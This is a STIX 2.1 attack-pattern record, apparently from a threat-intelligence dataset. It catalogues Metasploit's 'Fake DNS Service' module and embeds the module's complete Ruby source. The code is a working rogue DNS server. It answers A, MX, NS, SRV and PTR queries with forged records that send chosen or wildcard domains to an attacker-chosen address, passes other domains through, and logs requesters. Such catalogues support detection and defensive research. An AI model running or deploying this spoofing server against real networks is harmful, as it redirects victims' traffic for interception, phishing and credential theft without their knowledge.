{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--060b1844-f382-4825-af29-a0b2795b1363",
    "created": "2024-08-14T16:21:55.033346Z",
    "modified": "2024-08-14T16:21:55.03335Z",
    "name": "Fake DNS Service",
    "description": " This module provides a DNS service that redirects all queries to a particular address. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/fakedns.rb",
            "external_id": "fakedns.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'resolv'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n\n\n  def initialize\n    super(\n      'Name'        => 'Fake DNS Service',\n      'Description'    => %q{\n        This module provides a DNS service that redirects\n      all queries to a particular address.\n      },\n      'Author'      => ['ddz', 'hdm', 'fozavci'],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Service', 'Description' => 'Run DNS server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Service'\n        ],\n      'DefaultAction'  => 'Service'\n    )\n\n    register_options(\n      [\n        OptAddress.new('SRVHOST',   [ true, \"The local host to listen on.\", '0.0.0.0' ]),\n        OptPort.new('SRVPORT',      [ true, \"The local port to listen on.\", 53 ]),\n        OptAddress.new('TARGETHOST', [ false, \"The address that all names should resolve to\", nil ]),\n        OptString.new('TARGETDOMAIN', [ true, \"The list of target domain names we want to fully resolve (BYPASS) or fake resolve (FAKE). Use '*' for wildcard.\", 'www.google.com']),\n        OptEnum.new('TARGETACTION', [ true, \"Action for TARGETDOMAIN\", \"BYPASS\", %w{FAKE BYPASS}]),\n      ])\n\n    register_advanced_options(\n      [\n        OptPort.new('RR_SRV_PORT', [ false, \"The port field in the SRV response when FAKE\", 5060]),\n        OptBool.new('LogConsole', [ false, \"Determines whether to log all request to the console\", true]),\n        OptBool.new('LogDatabase', [ false, \"Determines whether to log all request to the database\", false]),\n      ])\n  end\n\n\n  def target_host(addr = nil)\n    target = datastore['TARGETHOST']\n    if target.blank?\n      if addr\n        ::Rex::Socket.source_address(addr)\n      else\n        nil\n      end\n    else\n      ::Rex::Socket.resolv_to_dotted(target)\n    end\n  end\n\n  def run\n    @port = datastore['SRVPORT'].to_i\n\n    @log_console  = false\n    @log_database = false\n\n    if datastore['LogConsole']\n      @log_console = true\n    end\n\n    if datastore['LogDatabase']\n      @log_database = true\n    end\n\n    # MacOS X workaround\n    ::Socket.do_not_reverse_lookup = true\n\n    print_status(\"DNS server initializing\")\n    @sock = ::UDPSocket.new()\n    @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)\n    @sock.bind(datastore['SRVHOST'], @port)\n    @run = true\n    @domain_target_list = datastore['TARGETDOMAIN'].split\n    @bypass = ( datastore['TARGETACTION'].upcase == \"BYPASS\" )\n\n    print_status(\"DNS server started\")\n    begin\n\n    while @run\n      @error_resolving = false\n      packet, addr = @sock.recvfrom(65535)\n      src_addr = addr[3]\n      @requestor = addr\n      next if packet.length == 0\n\n      request = Resolv::DNS::Message.decode(packet)\n      next unless request.qr == 0\n\n      #\n      # XXX: Track request IDs by requesting IP address and port\n      #\n      # Windows XP SP1a: UDP source port constant,\n      #  sequential IDs since boot time\n      # Windows XP SP2: Randomized IDs\n      #\n      # Debian 3.1: Static source port (32906) until timeout,\n      #  randomized IDs\n      #\n\n      lst = []\n\n      request.each_question {|name, typeclass|\n        # Identify potential domain exceptions\n        @match_target = false\n        @match_name = name.to_s\n        @domain_target_list.each do |ex|\n          escaped = Regexp.escape(ex).gsub('\\*','.*?')\n          regex = Regexp.new \"^#{escaped}$\", Regexp::IGNORECASE\n          if ( name.to_s =~ regex )\n            @match_target = true\n            @match_name = ex\n          end\n        end\n\n        tc_s = typeclass.to_s().gsub(/^Resolv::DNS::Resource::/, \"\")\n\n        request.qr = 1\n        request.ra = 1\n\n        lst << \"#{tc_s} #{name}\"\n        case tc_s\n        when 'IN::A'\n\n          # Special fingerprinting name lookups:\n          #\n          # _isatap -> XP SP = 0\n          # isatap.localdomain -> XP SP >= 1\n          # teredo.ipv6.microsoft.com -> XP SP >= 2\n          #\n          # time.windows.com -> windows ???\n          # wpad.localdomain -> windows ???\n          #\n          # <hostname> SOA -> windows XP self hostname lookup\n          #\n\n          answer = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))\n\n          if (@match_target and not @bypass) or (not @match_target and @bypass)\n            # Resolve FAKE response\n            if (@log_console)\n              print_status(\"DNS target domain #{@match_name} found; Returning fake A records for #{name}\")\n            end\n          else\n            # Resolve the exception domain\n            begin\n            ip = Resolv::DNS.new().getaddress(name).to_s\n            answer = Resolv::DNS::Resource::IN::A.new( ip )\n            rescue ::Exception => e\n              @error_resolving = true\n              next\n            end\n            if (@log_console)\n              print_status(\"DNS bypass domain #{@match_name} found; Returning real A records for #{name}\")\n            end\n          end\n\n\n          request.add_answer(name, 60, answer)\n\n        when 'IN::MX'\n          mx = Resolv::DNS::Resource::IN::MX.new(10, Resolv::DNS::Name.create(\"mail.#{name}\"))\n          ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(\"dns.#{name}\"))\n          ar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))\n          request.add_answer(name, 60, mx)\n          request.add_authority(name, 60, ns)\n          request.add_additional(Resolv::DNS::Name.create(\"mail.#{name}\"), 60, ar)\n\n        when 'IN::NS'\n          ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(\"dns.#{name}\"))\n          ar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))\n          request.add_answer(name, 60, ns)\n          request.add_additional(name, 60, ar)\n\n        when 'IN::SRV'\n          if @bypass || !@match_target\n            if @log_console\n              print_status(\"DNS bypass domain #{@match_name} found; Returning real SRV records for #{name}\")\n            end\n            # if we are in bypass mode or we are in fake mode but the target didn't match,\n            # just return the real response RRs\n            resources = Resolv::DNS.new().getresources(Resolv::DNS::Name.create(name), Resolv::DNS::Resource::IN::SRV)\n            if resources.empty?\n              @error_resolving = true\n              print_error(\"Unable to resolve SRV record for #{name} -- skipping\")\n              next\n            end\n            resources.each do |resource|\n              host = resource.target\n              port = resource.port.to_i\n              weight = resource.weight.to_i\n              priority = resource.priority.to_i\n              ttl = resource.ttl.to_i\n              request.add_answer(\n                name,\n                ttl,\n                Resolv::DNS::Resource::IN::SRV.new(priority, weight, port, Resolv::DNS::Name.create(host))\n              )\n            end\n          else\n            if @log_console\n              print_status(\"DNS target domain #{@match_name} found; Returning fake SRV records for #{name}\")\n              # Prepare the FAKE response\n              request.add_answer(\n                name,\n                10,\n                Resolv::DNS::Resource::IN::SRV.new(5, 0, datastore['RR_SRV_PORT'], Resolv::DNS::Name.create(name))\n              )\n              request.add_additional(Resolv::DNS::Name.create(name), 60, Resolv::DNS::Resource::IN::A.new(target_host(src_addr)))\n            end\n          end\n        when 'IN::PTR'\n          soa = Resolv::DNS::Resource::IN::SOA.new(\n            Resolv::DNS::Name.create(\"ns.internet.com\"),\n            Resolv::DNS::Name.create(\"root.internet.com\"),\n            1,\n            3600,\n            3600,\n            3600,\n            3600\n          )\n          ans = Resolv::DNS::Resource::IN::PTR.new(\n            Resolv::DNS::Name.create(\"www\")\n          )\n\n          request.add_answer(name, 60, ans)\n          request.add_authority(name, 60, soa)\n        else\n          lst << \"UNKNOWN #{tc_s}\"\n        end\n      }\n\n      if(@log_console)\n        if(@error_resolving)\n          print_error(\"XID #{request.id} (#{lst.join(\", \")}) - Error resolving\")\n        else\n          print_status(\"XID #{request.id} (#{lst.join(\", \")})\")\n        end\n      end\n\n      if(@log_database)\n        report_note(\n          :host => addr[3],\n          :type => \"dns_lookup\",\n          :data => \"#{addr[3]}:#{addr[1]} XID #{request.id} (#{lst.join(\", \")})\"\n        ) if lst.length > 0\n      end\n\n\n      @sock.send(request.encode(), 0, addr[3], addr[1])\n    end\n\n    rescue ::Exception => e\n      print_error(\"fakedns: #{e.class} #{e} #{e.backtrace}\")\n    # Make sure the socket gets closed on exit\n    ensure\n      @sock.close\n    end\n  end\n\n  def print_error(msg)\n    @requestor ? super(\"%s:%p - DNS - %s\" % [@requestor[3], @requestor[1], msg]) : super(msg)\n  end\n\n  def print_status(msg)\n    @requestor ? super(\"%s:%p - DNS - %s\" % [@requestor[3], @requestor[1], msg]) : super(msg)\n  end\nend\n"
}